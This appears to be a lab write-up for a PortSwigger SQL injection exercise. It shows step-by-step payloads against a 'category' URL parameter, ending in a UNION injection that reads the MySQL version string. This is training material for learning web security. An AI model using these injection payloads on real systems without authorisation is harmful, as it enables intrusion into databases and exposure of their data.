
# SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. (Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2')

---------------------------------------------
Reference: 
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


Filtering using GET parameter “category”: "/filter?category=Accesories"

<img width="1283" height="863" alt="1" src="https://github.com/user-attachments/assets/3bac46cf-d13d-4cd4-bb21-6f9e8f2e3bb2" />


/filter?category=Accesories -> Return 4 items

/filter?category=Accessories';# -> Return 4 items, the query is finished

/filter?category=Accessories'+and+'1'='1  -> Return 4 items

/filter?category=Accessories'+and+'1'='0  -> Return 0 items

/filter?category=Accessories'+union+select+0,@@version#

```
/filter?category=Accessories'+union+select+0,@@version#
``` 

<img width="1534" height="832" alt="2" src="https://github.com/user-attachments/assets/706a6b72-4a5a-4647-924c-2db77e8dfc17" />


